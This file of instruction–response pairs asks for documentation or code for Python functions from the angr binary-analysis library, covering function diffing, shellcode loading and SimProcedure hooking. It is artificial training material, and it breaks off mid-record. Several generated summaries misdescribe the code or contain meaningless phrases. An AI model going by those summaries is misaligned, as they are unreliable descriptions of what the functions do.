{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _is_better_match(x, y, matched_a, matched_b, attributes_dict_a, attributes_dict_b):\n    attributes_x = attributes_dict_a[x]\n    attributes_y = attributes_dict_b[y]\n    if x in matched_a:\n        attributes_match = attributes_dict_b[matched_a[x]]\n        if _euclidean_dist(attributes_x, attributes_y) >= _euclidean_dist(attributes_x, attributes_match):\n            return False\n    if y in matched_b:\n        attributes_match = attributes_dict_a[matched_b[y]]\n        if _euclidean_dist(attributes_x, attributes_y) >= _euclidean_dist(attributes_y, attributes_match):\n            return False\n    return True", "response": "Returns True if the two sets have the same attributes."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef differing_constants(block_a, block_b):\n    statements_a = [s for s in block_a.vex.statements if s.tag != \"Ist_IMark\"] + [block_a.vex.next]\n    statements_b = [s for s in block_b.vex.statements if s.tag != \"Ist_IMark\"] + [block_b.vex.next]\n    if len(statements_a) != len(statements_b):\n        raise UnmatchedStatementsException(\"Blocks have different numbers of statements\")\n\n    start_1 = min(block_a.instruction_addrs)\n    start_2 = min(block_b.instruction_addrs)\n\n    changes = []\n\n    # check statements\n    current_offset = None\n    for statement, statement_2 in zip(statements_a, statements_b):\n        # sanity check\n        if statement.tag != statement_2.tag:\n            raise UnmatchedStatementsException(\"Statement tag has changed\")\n\n        if statement.tag == \"Ist_IMark\":\n            if statement.addr - start_1 != statement_2.addr - start_2:\n                raise UnmatchedStatementsException(\"Instruction length has changed\")\n            current_offset = statement.addr - start_1\n            continue\n\n        differences = compare_statement_dict(statement, statement_2)\n        for d in differences:\n            if d.type != DIFF_VALUE:\n                raise UnmatchedStatementsException(\"Instruction has changed\")\n            else:\n                changes.append(ConstantChange(current_offset, d.value_a, d.value_b))\n\n    return changes", "response": "Compares two basic blocks and returns all the constants that differ from the first block to the second block."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef probably_identical(self):\n        if len(self._unmatched_blocks_from_a | self._unmatched_blocks_from_b) > 0:\n            return False\n        for (a, b) in self._block_matches:\n            if not self.blocks_probably_identical(a, b):\n                return False\n        return True", "response": "Returns True if all the two functions are identical."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a list of all the identical blocks in the cache.", "response": "def identical_blocks(self):\n        \"\"\"\n        :returns: A list of block matches which appear to be identical\n        \"\"\"\n        identical_blocks = []\n        for (block_a, block_b) in self._block_matches:\n            if self.blocks_probably_identical(block_a, block_b):\n                identical_blocks.append((block_a, block_b))\n        return identical_blocks"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a list of all blocks which appear to differ in the same entry.", "response": "def differing_blocks(self):\n        \"\"\"\n        :returns: A list of block matches which appear to differ\n        \"\"\"\n        differing_blocks = []\n        for (block_a, block_b) in self._block_matches:\n            if not self.blocks_probably_identical(block_a, block_b):\n                differing_blocks.append((block_a, block_b))\n        return differing_blocks"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef blocks_with_differing_constants(self):\n        differing_blocks = []\n        diffs = dict()\n        for (block_a, block_b) in self._block_matches:\n            if self.blocks_probably_identical(block_a, block_b) and \\\n                    not self.blocks_probably_identical(block_a, block_b, check_constants=True):\n                differing_blocks.append((block_a, block_b))\n        for block_a, block_b in differing_blocks:\n            ba = NormalizedBlock(block_a, self._function_a)\n            bb = NormalizedBlock(block_b, self._function_b)\n            diffs[(block_a, block_b)] = FunctionDiff._block_diff_constants(ba, bb)\n        return diffs", "response": "Returns a list of blocks which appear to differ in the same function."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncomputing the similarity of two basic blocks.", "response": "def block_similarity(self, block_a, block_b):\n        \"\"\"\n        :param block_a: The first block address.\n        :param block_b: The second block address.\n        :returns:       The similarity of the basic blocks, normalized for the base address of the block and function\n                        call addresses.\n        \"\"\"\n\n        # handle sim procedure blocks\n        if self._project_a.is_hooked(block_a) and self._project_b.is_hooked(block_b):\n            if self._project_a._sim_procedures[block_a] == self._project_b._sim_procedures[block_b]:\n                return 1.0\n            else:\n                return 0.0\n\n        try:\n            block_a = NormalizedBlock(block_a, self._function_a)\n        except (SimMemoryError, SimEngineError):\n            block_a = None\n\n        try:\n            block_b = NormalizedBlock(block_b, self._function_b)\n        except (SimMemoryError, SimEngineError):\n            block_b = None\n\n        # if both were None then they are assumed to be the same, if only one was the same they are assumed to differ\n        if block_a is None and block_b is None:\n            return 1.0\n        elif block_a is None or block_b is None:\n            return 0.0\n\n        # get all elements for computing similarity\n        tags_a = [s.tag for s in block_a.statements]\n        tags_b = [s.tag for s in block_b.statements]\n        consts_a = [c.value for c in block_a.all_constants]\n        consts_b = [c.value for c in block_b.all_constants]\n        all_registers_a = [s.offset for s in block_a.statements if hasattr(s, \"offset\")]\n        all_registers_b = [s.offset for s in block_b.statements if hasattr(s, \"offset\")]\n        jumpkind_a = block_a.jumpkind\n        jumpkind_b = block_b.jumpkind\n\n        # compute total distance\n        total_dist = 0\n        total_dist += _levenshtein_distance(tags_a, tags_b)\n        total_dist += _levenshtein_distance(block_a.operations, block_b.operations)\n        total_dist += _levenshtein_distance(all_registers_a, all_registers_b)\n        acceptable_differences = self._get_acceptable_constant_differences(block_a, block_b)\n        total_dist += _normalized_levenshtein_distance(consts_a, consts_b, acceptable_differences)\n        total_dist += 0 if jumpkind_a == jumpkind_b else 1\n\n        # compute similarity\n        num_values = max(len(tags_a), len(tags_b))\n        num_values += max(len(consts_a), len(consts_b))\n        num_values += max(len(block_a.operations), len(block_b.operations))\n        num_values += 1  # jumpkind\n        similarity = 1 - (float(total_dist) / num_values)\n\n        return similarity"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nchecking if two blocks are identical.", "response": "def blocks_probably_identical(self, block_a, block_b, check_constants=False):\n        \"\"\"\n        :param block_a:         The first block address.\n        :param block_b:         The second block address.\n        :param check_constants: Whether or not to require matching constants in blocks.\n        :returns:               Whether or not the blocks appear to be identical.\n        \"\"\"\n        # handle sim procedure blocks\n        if self._project_a.is_hooked(block_a) and self._project_b.is_hooked(block_b):\n            return self._project_a._sim_procedures[block_a] == self._project_b._sim_procedures[block_b]\n\n        try:\n            block_a = NormalizedBlock(block_a, self._function_a)\n        except (SimMemoryError, SimEngineError):\n            block_a = None\n\n        try:\n            block_b = NormalizedBlock(block_b, self._function_b)\n        except (SimMemoryError, SimEngineError):\n            block_b = None\n\n        # if both were None then they are assumed to be the same, if only one was None they are assumed to differ\n        if block_a is None and block_b is None:\n            return True\n        elif block_a is None or block_b is None:\n            return False\n\n        # if they represent a different number of blocks they are not the same\n        if len(block_a.blocks) != len(block_b.blocks):\n            return False\n\n        # check differing constants\n        try:\n            diff_constants = FunctionDiff._block_diff_constants(block_a, block_b)\n        except UnmatchedStatementsException:\n            return False\n\n        if not check_constants:\n            return True\n\n        # get values of differences that probably indicate no change\n        acceptable_differences = self._get_acceptable_constant_differences(block_a, block_b)\n\n        # todo match globals\n        for c in diff_constants:\n            if (c.value_a, c.value_b) in self._block_matches:\n                # constants point to matched basic blocks\n                continue\n            if self._bindiff is not None and (c.value_a and c.value_b) in self._bindiff.function_matches:\n                # constants point to matched functions\n                continue\n            # if both are in the binary we'll assume it's okay, although we should really match globals\n            # TODO use global matches\n            if self._project_a.loader.main_object.contains_addr(c.value_a) and \\\n                    self._project_b.loader.main_object.contains_addr(c.value_b):\n                continue\n            # if the difference is equal to the difference in block addr's or successor addr's we'll say it's also okay\n            if c.value_b - c.value_a in acceptable_differences:\n                continue\n            # otherwise they probably are different\n            return False\n\n        # the blocks appear to be identical\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncomputes the basic block attributes for a given function.", "response": "def _compute_block_attributes(function):\n        \"\"\"\n        :param function:    A normalized function object.\n        :returns:           A dictionary of basic block addresses to tuples of attributes.\n        \"\"\"\n        # The attributes we use are the distance form function start, distance from function exit and whether\n        # or not it has a subfunction call\n        distances_from_start = FunctionDiff._distances_from_function_start(function)\n        distances_from_exit = FunctionDiff._distances_from_function_exit(function)\n        call_sites = function.call_sites\n\n        attributes = {}\n        for block in function.graph.nodes():\n            if block in call_sites:\n                number_of_subfunction_calls = len(call_sites[block])\n            else:\n                number_of_subfunction_calls = 0\n            # there really shouldn't be blocks that can't be reached from the start, but there are for now\n            dist_start = distances_from_start[block] if block in distances_from_start else 10000\n            dist_exit = distances_from_exit[block] if block in distances_from_exit else 10000\n\n            attributes[block] = (dist_start, dist_exit, number_of_subfunction_calls)\n\n        return attributes"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a dictionary of basic block addresses and their distance to the exit of the function.", "response": "def _distances_from_function_exit(function):\n        \"\"\"\n        :param function:    A normalized Function object.\n        :returns:           A dictionary of basic block addresses and their distance to the exit of the function.\n        \"\"\"\n        reverse_graph = function.graph.reverse()\n        # we aren't guaranteed to have an exit from the function so explicitly add the node\n        reverse_graph.add_node(\"start\")\n        found_exits = False\n        for n in function.graph.nodes():\n            if len(list(function.graph.successors(n))) == 0:\n                reverse_graph.add_edge(\"start\", n)\n                found_exits = True\n\n        # if there were no exits (a function with a while 1) let's consider the block with the highest address to\n        # be the exit. This isn't the most scientific way, but since this case is pretty rare it should be okay\n        if not found_exits:\n            last = max(function.graph.nodes(), key=lambda x:x.addr)\n            reverse_graph.add_edge(\"start\", last)\n\n        dists = networkx.single_source_shortest_path_length(reverse_graph, \"start\")\n\n        # remove temp node\n        del dists[\"start\"]\n\n        # correct for the added node\n        for n in dists:\n            dists[n] -= 1\n\n        return dists"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _compute_diff(self):\n        # get the attributes for all blocks\n        l.debug(\"Computing diff of functions: %s, %s\",\n                (\"%#x\" % self._function_a.startpoint.addr) if self._function_a.startpoint is not None else \"None\",\n                (\"%#x\" % self._function_b.startpoint.addr) if self._function_b.startpoint is not None else \"None\"\n                )\n        self.attributes_a = self._compute_block_attributes(self._function_a)\n        self.attributes_b = self._compute_block_attributes(self._function_b)\n\n        # get the initial matches\n        initial_matches = self._get_block_matches(self.attributes_a, self.attributes_b,\n                                                  tiebreak_with_block_similarity=False)\n\n        # Use a queue so we process matches in the order that they are found\n        to_process = deque(initial_matches)\n\n        # Keep track of which matches we've already added to the queue\n        processed_matches = set((x, y) for (x, y) in initial_matches)\n\n        # Keep a dict of current matches, which will be updated if better matches are found\n        matched_a = dict()\n        matched_b = dict()\n        for (x, y) in processed_matches:\n            matched_a[x] = y\n            matched_b[y] = x\n\n        # while queue is not empty\n        while to_process:\n            (block_a, block_b) = to_process.pop()\n            l.debug(\"FunctionDiff: Processing (%#x, %#x)\", block_a.addr, block_b.addr)\n\n            # we could find new matches in the successors or predecessors of functions\n            block_a_succ = list(self._function_a.graph.successors(block_a))\n            block_b_succ = list(self._function_b.graph.successors(block_b))\n            block_a_pred = list(self._function_a.graph.predecessors(block_a))\n            block_b_pred = list(self._function_b.graph.predecessors(block_b))\n\n            # propagate the difference in blocks as delta\n            delta = tuple((i-j) for i, j in zip(self.attributes_b[block_b], self.attributes_a[block_a]))\n\n            # get possible new matches\n            new_matches = []\n\n            # if the blocks are identical then the successors should most likely be matched in the same order\n            if self.blocks_probably_identical(block_a, block_b) and len(block_a_succ) == len(block_b_succ):\n                ordered_succ_a = self._get_ordered_successors(self._project_a, block_a, block_a_succ)\n                ordered_succ_b = self._get_ordered_successors(self._project_b, block_b, block_b_succ)\n                new_matches.extend(zip(ordered_succ_a, ordered_succ_b))\n\n            new_matches += self._get_block_matches(self.attributes_a, self.attributes_b, block_a_succ, block_b_succ,\n                                                   delta, tiebreak_with_block_similarity=True)\n            new_matches += self._get_block_matches(self.attributes_a, self.attributes_b, block_a_pred, block_b_pred,\n                                                   delta, tiebreak_with_block_similarity=True)\n\n            # for each of the possible new matches add it if it improves the matching\n            for (x, y) in new_matches:\n                if (x, y) not in processed_matches:\n                    processed_matches.add((x, y))\n                    l.debug(\"FunctionDiff: checking if (%#x, %#x) is better\", x.addr, y.addr)\n                    # if it's a better match than what we already have use it\n                    if _is_better_match(x, y, matched_a, matched_b, self.attributes_a, self.attributes_b):\n                        l.debug(\"FunctionDiff: adding possible match (%#x, %#x)\", x.addr, y.addr)\n                        if x in matched_a:\n                            old_match = matched_a[x]\n                            del matched_b[old_match]\n                        if y in matched_b:\n                            old_match = matched_b[y]\n                            del matched_a[old_match]\n                        matched_a[x] = y\n                        matched_b[y] = x\n                        to_process.appendleft((x, y))\n\n        # reformat matches into a set of pairs\n        self._block_matches = set((x, y) for (x, y) in matched_a.items())\n\n        # get the unmatched blocks\n        self._unmatched_blocks_from_a = set(x for x in self._function_a.graph.nodes() if x not in matched_a)\n        self._unmatched_blocks_from_b = set(x for x in self._function_b.graph.nodes() if x not in matched_b)", "response": "Compute the diff between the functions and saves the result."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _get_block_matches(self, attributes_a, attributes_b, filter_set_a=None, filter_set_b=None, delta=(0, 0, 0),\n                           tiebreak_with_block_similarity=False):\n        \"\"\"\n        :param attributes_a:    A dict of blocks to their attributes\n        :param attributes_b:    A dict of blocks to their attributes\n\n        The following parameters are optional.\n\n        :param filter_set_a:    A set to limit attributes_a to the blocks in this set.\n        :param filter_set_b:    A set to limit attributes_b to the blocks in this set.\n        :param delta:           An offset to add to each vector in attributes_a.\n        :returns:               A list of tuples of matching objects.\n        \"\"\"\n        # get the attributes that are in the sets\n        if filter_set_a is None:\n            filtered_attributes_a = {k: v for k, v in attributes_a.items()}\n        else:\n            filtered_attributes_a = {k: v for k, v in attributes_a.items() if k in filter_set_a}\n\n        if filter_set_b is None:\n            filtered_attributes_b = {k: v for k, v in attributes_b.items()}\n        else:\n            filtered_attributes_b = {k: v for k, v in attributes_b.items() if k in filter_set_b}\n\n        # add delta\n        for k in filtered_attributes_a:\n            filtered_attributes_a[k] = tuple((i+j) for i, j in zip(filtered_attributes_a[k], delta))\n        for k in filtered_attributes_b:\n            filtered_attributes_b[k] = tuple((i+j) for i, j in zip(filtered_attributes_b[k], delta))\n\n        # get closest\n        closest_a = _get_closest_matches(filtered_attributes_a, filtered_attributes_b)\n        closest_b = _get_closest_matches(filtered_attributes_b, filtered_attributes_a)\n\n        if tiebreak_with_block_similarity:\n            # use block similarity to break ties in the first set\n            for a in closest_a:\n                if len(closest_a[a]) > 1:\n                    best_similarity = 0\n                    best = []\n                    for x in closest_a[a]:\n                        similarity = self.block_similarity(a, x)\n                        if similarity > best_similarity:\n                            best_similarity = similarity\n                            best = [x]\n                        elif similarity == best_similarity:\n                            best.append(x)\n                    closest_a[a] = best\n\n            # use block similarity to break ties in the second set\n            for b in closest_b:\n                if len(closest_b[b]) > 1:\n                    best_similarity = 0\n                    best = []\n                    for x in closest_b[b]:\n                        similarity = self.block_similarity(x, b)\n                        if similarity > best_similarity:\n                            best_similarity = similarity\n                            best = [x]\n                        elif similarity == best_similarity:\n                            best.append(x)\n                    closest_b[b] = best\n\n        # a match (x,y) is good if x is the closest to y and y is the closest to x\n        matches = []\n        for a in closest_a:\n            if len(closest_a[a]) == 1:\n                match = closest_a[a][0]\n                if len(closest_b[match]) == 1 and closest_b[match][0] == a:\n                    matches.append((a, match))\n\n        return matches", "response": "Get the set of attributes that are in the set and the closest matches."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef functions_probably_identical(self, func_a_addr, func_b_addr, check_consts=False):\n        if self.cfg_a.project.is_hooked(func_a_addr) and self.cfg_b.project.is_hooked(func_b_addr):\n            return self.cfg_a.project._sim_procedures[func_a_addr] == self.cfg_b.project._sim_procedures[func_b_addr]\n\n        func_diff = self.get_function_diff(func_a_addr, func_b_addr)\n        if check_consts:\n            return func_diff.probably_identical_with_consts\n\n        return func_diff.probably_identical", "response": "Compare two functions and return True if they appear identical."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef identical_functions(self):\n        identical_funcs = []\n        for (func_a, func_b) in self.function_matches:\n            if self.functions_probably_identical(func_a, func_b):\n                identical_funcs.append((func_a, func_b))\n        return identical_funcs", "response": "Returns a list of function matches that appear to be identical to the entry point."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef differing_functions(self):\n        different_funcs = []\n        for (func_a, func_b) in self.function_matches:\n            if not self.functions_probably_identical(func_a, func_b):\n                different_funcs.append((func_a, func_b))\n        return different_funcs", "response": "Returns a list of functions that appear to differ in the same resource."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef differing_functions_with_consts(self):\n        different_funcs = []\n        for (func_a, func_b) in self.function_matches:\n            if not self.functions_probably_identical(func_a, func_b, check_consts=True):\n                different_funcs.append((func_a, func_b))\n        return different_funcs", "response": "Returns a list of functions that appear to differ including just by constants."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a list of all the blocks that appear to differ in the same entry.", "response": "def differing_blocks(self):\n        \"\"\"\n        :returns: A list of block matches that appear to differ\n        \"\"\"\n        differing_blocks = []\n        for (func_a, func_b) in self.function_matches:\n            differing_blocks.extend(self.get_function_diff(func_a, func_b).differing_blocks)\n        return differing_blocks"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef identical_blocks(self):\n        identical_blocks = []\n        for (func_a, func_b) in self.function_matches:\n            identical_blocks.extend(self.get_function_diff(func_a, func_b).identical_blocks)\n        return identical_blocks", "response": "A list of all block matches that appear to be identical"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef blocks_with_differing_constants(self):\n        diffs = dict()\n        for (func_a, func_b) in self.function_matches:\n            diffs.update(self.get_function_diff(func_a, func_b).blocks_with_differing_constants)\n        return diffs", "response": "A dict of block matches with differing constants to the tuple of constants\n       "}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_function_diff(self, function_addr_a, function_addr_b):\n        pair = (function_addr_a, function_addr_b)\n        if pair not in self._function_diffs:\n            function_a = self.cfg_a.kb.functions.function(function_addr_a)\n            function_b = self.cfg_b.kb.functions.function(function_addr_b)\n            self._function_diffs[pair] = FunctionDiff(function_a, function_b, self)\n        return self._function_diffs[pair]", "response": "Returns the FunctionDiff object for the two functions in the binary."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncomputes the attributes of the functions in the object store.", "response": "def _compute_function_attributes(cfg):\n        \"\"\"\n        :param cfg: An angr CFG object\n        :returns:    a dictionary of function addresses to tuples of attributes\n        \"\"\"\n        # the attributes we use are the number of basic blocks, number of edges, and number of subfunction calls\n        attributes = dict()\n        all_funcs = set(cfg.kb.callgraph.nodes())\n        for function_addr in cfg.kb.functions:\n            # skip syscalls and functions which are None in the cfg\n            if cfg.kb.functions.function(function_addr) is None or cfg.kb.functions.function(function_addr).is_syscall:\n                continue\n            if cfg.kb.functions.function(function_addr) is not None:\n                normalized_funtion = NormalizedFunction(cfg.kb.functions.function(function_addr))\n                number_of_basic_blocks = len(normalized_funtion.graph.nodes())\n                number_of_edges = len(normalized_funtion.graph.edges())\n            else:\n                number_of_basic_blocks = 0\n                number_of_edges = 0\n            if function_addr in all_funcs:\n                number_of_subfunction_calls = len(list(cfg.kb.callgraph.successors(function_addr)))\n            else:\n                number_of_subfunction_calls = 0\n            attributes[function_addr] = (number_of_basic_blocks, number_of_edges, number_of_subfunction_calls)\n\n        return attributes"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _get_function_matches(attributes_a, attributes_b, filter_set_a=None, filter_set_b=None):\n        # get the attributes that are in the sets\n        if filter_set_a is None:\n            filtered_attributes_a = {k: v for k, v in attributes_a.items()}\n        else:\n            filtered_attributes_a = {k: v for k, v in attributes_a.items() if k in filter_set_a}\n\n        if filter_set_b is None:\n            filtered_attributes_b = {k: v for k, v in attributes_b.items()}\n        else:\n            filtered_attributes_b = {k: v for k, v in attributes_b.items() if k in filter_set_b}\n\n        # get closest\n        closest_a = _get_closest_matches(filtered_attributes_a, filtered_attributes_b)\n        closest_b = _get_closest_matches(filtered_attributes_b, filtered_attributes_a)\n\n        # a match (x,y) is good if x is the closest to y and y is the closest to x\n        matches = []\n        for a in closest_a:\n            if len(closest_a[a]) == 1:\n                match = closest_a[a][0]\n                if len(closest_b[match]) == 1 and closest_b[match][0] == a:\n                    matches.append((a, match))\n\n        return matches", "response": "Returns a list of tuples of matching functions."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef load_shellcode(shellcode, arch, start_offset=0, load_address=0):\n    return Project(\n            BytesIO(shellcode),\n            main_opts={\n                'backend': 'blob',\n                'arch': arch,\n                'entry_point': start_offset,\n                'base_addr': load_address,\n            }\n        )", "response": "Load a new project based on a string of raw bytecode."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _register_object(self, obj, sim_proc_arch):\n\n        # Step 1: get the set of libraries we are allowed to use to resolve unresolved symbols\n        missing_libs = []\n        for lib_name in self.loader.missing_dependencies:\n            try:\n                missing_libs.append(SIM_LIBRARIES[lib_name])\n            except KeyError:\n                l.info(\"There are no simprocedures for missing library %s :(\", lib_name)\n        # additionally provide libraries we _have_ loaded as a fallback fallback\n        # this helps in the case that e.g. CLE picked up a linux arm libc to satisfy an android arm binary\n        for lib in self.loader.all_objects:\n            if lib.provides in SIM_LIBRARIES:\n                simlib = SIM_LIBRARIES[lib.provides]\n                if simlib not in missing_libs:\n                    missing_libs.append(simlib)\n\n        # Step 2: Categorize every \"import\" symbol in each object.\n        # If it's IGNORED, mark it for stubbing\n        # If it's blacklisted, don't process it\n        # If it matches a simprocedure we have, replace it\n        for reloc in obj.imports.values():\n            # Step 2.1: Quick filter on symbols we really don't care about\n            func = reloc.symbol\n            if func is None:\n                continue\n            if not func.is_function and func.type != cle.backends.symbol.Symbol.TYPE_NONE:\n                continue\n            if not reloc.resolved:\n                # This is a hack, effectively to support Binary Ninja, which doesn't provide access to dependency\n                # library names. The backend creates the Relocation objects, but leaves them unresolved so that\n                # we can try to guess them here. Once the Binary Ninja API starts supplying the dependencies,\n                # The if/else, along with Project._guess_simprocedure() can be removed if it has no other utility,\n                # just leave behind the 'unresolved' debug statement from the else clause.\n                if reloc.owner.guess_simprocs:\n                    l.debug(\"Looking for matching SimProcedure for unresolved %s from %s with hint %s\",\n                            func.name, reloc.owner, reloc.owner.guess_simprocs_hint)\n                    self._guess_simprocedure(func, reloc.owner.guess_simprocs_hint)\n                else:\n                    l.debug(\"Ignoring unresolved import '%s' from %s ...?\", func.name, reloc.owner)\n                continue\n            export = reloc.resolvedby\n            if self.is_hooked(export.rebased_addr):\n                l.debug(\"Already hooked %s (%s)\", export.name, export.owner)\n                continue\n\n            # Step 2.2: If this function has been resolved by a static dependency,\n            # check if we actually can and want to replace it with a SimProcedure.\n            # We opt out of this step if it is blacklisted by ignore_functions, which\n            # will cause it to be replaced by ReturnUnconstrained later.\n            if export.owner is not self.loader._extern_object and \\\n                    export.name not in self._ignore_functions:\n                if self._check_user_blacklists(export.name):\n                    continue\n                owner_name = export.owner.provides\n                if isinstance(self.loader.main_object, cle.backends.pe.PE):\n                    owner_name = owner_name.lower()\n                if owner_name not in SIM_LIBRARIES:\n                    continue\n                sim_lib = SIM_LIBRARIES[owner_name]\n                if not sim_lib.has_implementation(export.name):\n                    continue\n                l.info(\"Using builtin SimProcedure for %s from %s\", export.name, sim_lib.name)\n                self.hook_symbol(export.rebased_addr, sim_lib.get(export.name, sim_proc_arch))\n\n            # Step 2.3: If 2.2 didn't work, check if the symbol wants to be resolved\n            # by a library we already know something about. Resolve it appropriately.\n            # Note that _check_user_blacklists also includes _ignore_functions.\n            # An important consideration is that even if we're stubbing a function out,\n            # we still want to try as hard as we can to figure out where it comes from\n            # so we can get the calling convention as close to right as possible.\n            elif reloc.resolvewith is not None and reloc.resolvewith in SIM_LIBRARIES:\n                sim_lib = SIM_LIBRARIES[reloc.resolvewith]\n                if self._check_user_blacklists(export.name):\n                    if not func.is_weak:\n                        l.info(\"Using stub SimProcedure for unresolved %s from %s\", func.name, sim_lib.name)\n                        self.hook_symbol(export.rebased_addr, sim_lib.get_stub(export.name, sim_proc_arch))\n                else:\n                    l.info(\"Using builtin SimProcedure for unresolved %s from %s\", export.name, sim_lib.name)\n                    self.hook_symbol(export.rebased_addr, sim_lib.get(export.name, sim_proc_arch))\n\n            # Step 2.4: If 2.3 didn't work (the symbol didn't request a provider we know of), try\n            # looking through each of the SimLibraries we're using to resolve unresolved\n            # functions. If any of them know anything specifically about this function,\n            # resolve it with that. As a final fallback, just ask any old SimLibrary\n            # to resolve it.\n            elif missing_libs:\n                for sim_lib in missing_libs:\n                    if sim_lib.has_metadata(export.name):\n                        if self._check_user_blacklists(export.name):\n                            if not func.is_weak:\n                                l.info(\"Using stub SimProcedure for unresolved %s from %s\", export.name, sim_lib.name)\n                                self.hook_symbol(export.rebased_addr, sim_lib.get_stub(export.name, sim_proc_arch))\n                        else:\n                            l.info(\"Using builtin SimProcedure for unresolved %s from %s\", export.name, sim_lib.name)\n                            self.hook_symbol(export.rebased_addr, sim_lib.get(export.name, sim_proc_arch))\n                        break\n                else:\n                    if not func.is_weak:\n                        l.info(\"Using stub SimProcedure for unresolved %s\", export.name)\n                        self.hook_symbol(export.rebased_addr, missing_libs[0].get(export.name, sim_proc_arch))\n\n            # Step 2.5: If 2.4 didn't work (we have NO SimLibraries to work with), just\n            # use the vanilla ReturnUnconstrained, assuming that this isn't a weak func\n            elif not func.is_weak:\n                l.info(\"Using stub SimProcedure for unresolved %s\", export.name)\n                self.hook_symbol(export.rebased_addr, SIM_PROCEDURES['stubs']['ReturnUnconstrained'](display_name=export.name, is_stub=True))", "response": "This function scans through an object imports and hooks them with simprocedures from our library and adds the needed libraries to the object if they don t have any."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nguesses the SimProcedure for a symbol name f.", "response": "def _guess_simprocedure(self, f, hint):\n        \"\"\"\n        Does symbol name `f` exist as a SIM_PROCEDURE? If so, return it, else return None.\n        Narrows down the set of libraries to search based on hint.\n        Part of the hack to enable Binary Ninja support. Remove if _register_objects() stops using it.\n        \"\"\"\n        # First, filter the SIM_LIBRARIES to a reasonable subset based on the hint\n        hinted_libs = []\n        if hint == \"win\":\n            hinted_libs = filter(lambda lib: lib if lib.endswith(\".dll\") else None, SIM_LIBRARIES)\n        else:\n            hinted_libs = filter(lambda lib: lib if \".so\" in lib else None, SIM_LIBRARIES)\n\n        for lib in hinted_libs:\n            if SIM_LIBRARIES[lib].has_implementation(f.name):\n                l.debug(\"Found implementation for %s in %s\", f, lib)\n                self.hook_symbol(f.relative_addr, (SIM_LIBRARIES[lib].get(f.name, self.arch)))\n                break\n        else:\n            l.debug(\"Could not find matching SimProcedure for %s, ignoring.\", f.name)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nchecks if the user has blacklisted the given symbol name f.", "response": "def _check_user_blacklists(self, f):\n        \"\"\"\n        Has symbol name `f` been marked for exclusion by any of the user\n        parameters?\n        \"\"\"\n        return not self._should_use_sim_procedures or \\\n            f in self._exclude_sim_procedures_list or \\\n            f in self._ignore_functions or \\\n            (self._exclude_sim_procedures_func is not None and self._exclude_sim_procedures_func(f))"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nhooks a section of code with a custom function. This is used internally to provide symbolic summaries of library functions, and can be used to instrument execution or to modify control flow. When hook is not specified, it returns a function decorator that allows easy hooking. Usage:: # Assuming proj is an instance of angr.Project, we will add a custom hook at the entry # point of the project. @proj.hook(proj.entry) def my_hook(state): print(\"Welcome to execution!\") :param addr: The address to hook. :param hook: A :class:`angr.project.Hook` describing a procedure to run at the given address. You may also pass in a SimProcedure class or a function directly and it will be wrapped in a Hook object for you. :param length: If you provide a function for the hook, this is the number of bytes that will be skipped by executing the hook by default. :param kwargs: If you provide a SimProcedure for the hook, these are the keyword arguments that will be passed to the procedure's `run` method eventually. :param replace: Control the behavior on finding that the address is already hooked. If true, silently replace the hook. If false (default), warn and do not replace the hook. If none, warn and replace the hook.", "response": "def hook(self, addr, hook=None, length=0, kwargs=None, replace=False):\n        \"\"\"\n        Hook a section of code with a custom function. This is used internally to provide symbolic\n        summaries of library functions, and can be used to instrument execution or to modify\n        control flow.\n\n        When hook is not specified, it returns a function decorator that allows easy hooking.\n        Usage::\n\n            # Assuming proj is an instance of angr.Project, we will add a custom hook at the entry\n            # point of the project.\n            @proj.hook(proj.entry)\n            def my_hook(state):\n                print(\"Welcome to execution!\")\n\n        :param addr:        The address to hook.\n        :param hook:        A :class:`angr.project.Hook` describing a procedure to run at the\n                            given address. You may also pass in a SimProcedure class or a function\n                            directly and it will be wrapped in a Hook object for you.\n        :param length:      If you provide a function for the hook, this is the number of bytes\n                            that will be skipped by executing the hook by default.\n        :param kwargs:      If you provide a SimProcedure for the hook, these are the keyword\n                            arguments that will be passed to the procedure's `run` method\n                            eventually.\n        :param replace:     Control the behavior on finding that the address is already hooked. If\n                            true, silently replace the hook. If false (default), warn and do not\n                            replace the hook. If none, warn and replace the hook.\n        \"\"\"\n        if hook is None:\n            # if we haven't been passed a thing to hook with, assume we're being used as a decorator\n            return self._hook_decorator(addr, length=length, kwargs=kwargs)\n\n        if kwargs is None: kwargs = {}\n\n        l.debug('hooking %s with %s', self._addr_to_str(addr), str(hook))\n\n        if self.is_hooked(addr):\n            if replace is True:\n                pass\n       